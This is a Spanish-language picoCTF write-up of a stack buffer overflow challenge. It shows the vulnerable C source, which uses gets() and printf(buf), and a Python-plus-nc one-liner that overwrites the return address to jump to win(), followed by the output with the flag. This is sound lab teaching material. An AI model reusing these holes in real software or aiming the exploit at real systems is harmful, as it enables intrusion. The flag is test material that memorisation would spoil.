## Objetivo
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln). You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 52058`
## Solución
Tenemos este codigo donde tenemos que ingresar un string.
La función win nos da la bandera.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```
Ya que no podemos llegar directamente a la función `win`, llenamos el buffer escribiendo letras "A" hasta que este se desborde. De esta manera, en lugar de regresar a `main`, el flujo se redirige hacia `win`, que es la función que nos otorga la bandera.
```
┌──(kali㉿Franco)-[~/picoCTF/binexp2/butter-overflow-1]
└─$ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo) | nc saturn.picoctf.net 52058
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_6462ca2d} 
```
## Notas adicionales

## Referencias